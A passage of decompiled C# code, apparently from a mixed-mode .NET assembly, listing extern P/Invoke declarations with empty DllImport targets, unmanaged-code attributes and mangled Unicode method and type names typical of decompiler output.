    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081\u00BD([In] uint obj0, [In] \u0081\u00BC* obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int* \u0081º();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0081\u00B6();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int Õ(
      [In] int* obj0,
      [In] char*** obj1,
      [In] char*** obj2,
      [In] int obj3,
      [In] \u0081\u00B7* obj4);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe \u0082\u00BD* \u0081\u00AC([In] char* obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081\u00A8([In] \u0081\u00BC* obj0);
  }
}
